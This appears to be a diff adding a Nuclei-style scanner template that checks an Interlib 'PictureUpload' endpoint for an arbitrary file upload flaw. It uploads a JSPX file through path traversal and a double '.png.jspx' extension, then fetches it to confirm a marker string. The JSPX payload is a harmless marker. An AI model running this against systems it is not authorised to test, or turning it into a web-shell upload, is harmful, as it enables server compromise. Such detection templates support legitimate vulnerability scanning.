@@ -1,0 +1,45 @@
+id: tuchuang-PictureUpload-File-upload
+
+info:
+  name: tuchuang-PictureUpload-File-upload
+  author: xxx
+  severity: high
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /interlib/loan/PictureUpload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="/../{{username}}"; filename="{{username}}.png.jspx"
+        Content-Type: image/png
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <jsp:root 
+            xmlns:jsp="http://java.sun.com/JSP/Page"
+            version="2.0">
+            
+            <jsp:text>sectestsectest</jsp:text>
+        </jsp:root>
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+  - raw:
+      - |
+        GET /interlib/{{username}}.png.jspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'sectestsectest'
+      - type: status
+        status: 
+          - 200
